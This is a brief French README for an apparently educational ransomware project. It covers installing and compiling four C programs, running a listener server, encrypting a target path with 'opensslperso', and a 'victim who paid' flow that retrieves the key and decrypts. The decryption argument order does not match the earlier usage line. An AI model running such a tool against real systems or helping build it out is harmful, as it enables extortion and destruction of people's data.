Installation :
-	sudo apt update
-	sudo apt install libssl-dev
-	sudo apt install build-essential
Compilation : 
-	gcc -o opensslperso opensslperso.c -lcrypto
-	gcc -o lovemonney lovemonney.c
-	gcc -o jaipaye jaipaye.c
-	gcc -o server server.c
Utilisation : 
Tu es méchant :

Lancer : 
	L’écoute serveur avec  ./server 
  	./opensslperso <CHEMIN_CIBLE> <VALUE>

VALUE prend la valeur 1 ou 2 --> 1 pour chiffrer et 2 --> déchiffrer.  

Tu t'es fait avoir et  tu as payé ton ravisseur: 

Lancer : 
 	./jaipaye   tu recevras la clé pour le déchiffrement. NE LA PERDS SURTOUT PAS 
 	./opensslperso 2 <CLE> <IV>
IV est trouvable via dans le fichier ‘.iv’

PS : Copier/colle est pratique et  ‘.iv’ se trouve au niveau du répertoire courant de l'exécution.

